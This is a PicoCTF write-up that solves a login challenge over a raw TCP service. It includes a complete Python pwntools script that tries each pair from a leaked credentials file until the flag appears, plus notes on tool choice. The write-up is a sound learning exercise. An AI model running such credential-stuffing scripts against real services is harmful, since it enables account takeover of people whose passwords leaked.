# PicoCTF — Credential Brute Force (TCP Login)

## Challenge Overview

| Field           | Details                                      |
|----------------|----------------------------------------------|
| **Platform**   | PicoCTF                                      |
| **Category**   | General Skills / Scripting                   |
| **Tools Used** | Python, pwntools                             |
| **Difficulty** | Beginner–Intermediate                        |

---

## Challenge Description

A website login challenge where a leaked credentials file was provided. The file contained username and password pairs separated by a semicolon (`username;password`). The goal was to find the valid credential pair that returns the flag.

---

## Initial Approach — Why Hydra Didn't Work

The first instinct was to use **Hydra**, a popular brute-force tool for web login forms. However, after analyzing the target, it became clear that this was **not a web-hosted service**. The service ran over a **raw TCP connection in the terminal**, not over HTTP/HTTPS.

| Factor              | Web Service (HTTP)         | Raw TCP Terminal Service     |
|--------------------|----------------------------|------------------------------|
| Protocol           | HTTP / HTTPS               | Raw TCP socket               |
| Tool fit           | Hydra, Burp Suite          | pwntools, netcat, scripts    |
| Login mechanism    | HTML form / API endpoint   | Interactive terminal prompt  |
| Response parsing   | HTTP status codes / HTML   | Plain text over socket       |

Hydra is designed for structured protocols (HTTP, FTP, SSH, etc.) and cannot reliably handle custom raw TCP prompts. This required a custom Python script using **pwntools**.

---

## Credential File Format

The leaked credentials file was a `.txt` file with entries in the following format:

```
username1;password1
username2;password2
username3;password3
...
```

Each line was split on the `;` delimiter to extract the username and password.

---

## Solution — Python pwntools Script

```python
from pwn import *

# Load credentials from file
with open("credentials.txt", "r") as f:
    creds = f.read().splitlines()

host = "<target-host>"
port = <target-port>

for line in creds:
    username, password = line.split(";")

    try:
        # Open a fresh TCP connection for every attempt
        conn = remote(host, port, timeout=5)

        # Wait for the username prompt and send username
        conn.recvuntil(b"username")
        conn.sendline(username.encode())

        # Wait for the password prompt and send password
        conn.recvuntil(b"password")
        conn.sendline(password.encode())

        # Read the server's response
        response = conn.recvall(timeout=3).decode(errors="ignore")

        # Check if the flag is in the response
        if "picoCTF{" in response:
            print(f"[+] Found valid credentials!")
            print(f"    Username : {username}")
            print(f"    Password : {password}")
            print(f"    Flag     : {response}")
            conn.close()
            break

        conn.close()

    except Exception as e:
        print(f"[-] Error with {username}:{password} — {e}")
        continue
```

### How It Works

1. **Opens the credentials file** and reads all lines.
2. **Splits each line** on `;` to get the username and password.
3. **Opens a new TCP connection** for each login attempt using `remote()` — this is necessary because most CTF services drop the connection after a failed login.
4. **Waits for the prompt** using `recvuntil()` before sending each value — this keeps communication synchronized with the server.
5. **Sends credentials** using `sendline()` which appends a newline, simulating pressing Enter.
6. **Reads the server's full response** with `recvall()` and checks if it contains the flag pattern `picoCTF{`.
7. **Stops and prints** the flag once a match is found.

---

## Key pwntools Functions Used

| Function          | Purpose                                                      |
|------------------|--------------------------------------------------------------|
| `remote(host, port)` | Establishes a raw TCP connection to the target           |
| `recvuntil(b"...")` | Receives data until a specific byte string is found       |
| `sendline(data)` | Sends data followed by a newline character (`\n`)           |
| `recvall()`      | Receives all remaining data from the connection             |
| `conn.close()`   | Cleanly closes the TCP connection                           |

---

## What I Learned

### Tool Selection
- **Difference between web-hosted services and raw TCP terminal services** — not every login target is an HTTP form; raw TCP services require socket-level interaction.
- **Why Hydra is not always suitable** — Hydra works great for structured protocols but cannot handle custom terminal prompts over raw TCP.

### Python & pwntools
- **Basics of pwntools for remote interaction** — how to connect, send, and receive data over TCP.
- **Using `remote()`** to establish a TCP connection programmatically.
- **Using `recvuntil()` and `sendline()`** for synchronized, prompt-aware communication.
- **Handling server responses programmatically** — reading and parsing plain-text replies to detect success.
- **Why a new connection is needed per attempt** — many CTF services and real-world systems terminate the session after a failed login.

### Scripting & Automation
- **Reading and parsing credential files in custom formats** — splitting on custom delimiters like `;`.
- **Automating brute-force login attempts** with Python loops.
- **Improving performance** by minimizing unnecessary delays and closing connections cleanly.

### Mindset
- **Analyzing the target environment before selecting tools** is the most important first step — the right tool depends entirely on what the target is, not just what looks familiar.
- **Real-world use of automation in CTF problem solving** — writing a script is often faster and more reliable than finding a GUI tool that fits.

---

## References

- [pwntools Documentation](https://docs.pwntools.com/en/stable/)
- [PicoCTF Platform](https://picoctf.org/)
- [pwntools `remote()` guide](https://docs.pwntools.com/en/stable/tubes/net.html)
